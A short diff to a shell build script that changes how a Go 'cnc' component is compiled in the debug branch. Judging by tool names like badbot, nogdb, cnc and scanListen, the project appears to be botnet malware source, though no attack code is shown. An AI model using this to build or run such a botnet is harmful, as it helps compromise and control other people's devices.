@@ -58,8 +58,12 @@ elif [ "$1" == "debug" ]; then
     gcc -std=c99 tools/enc.c -g -o debug/enc
     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
     gcc -std=c99 tools/badbot.c -g -o debug/badbot
-    go build -o debug/cnc cnc/*.go
+    (
+    cd cnc
+    go build -o ../debug/cnc
+    )
     go build -o debug/scanListen tools/scanListen.go
+
 else
     echo "Unknown parameter $1: $0 <debug | release>"
 fi
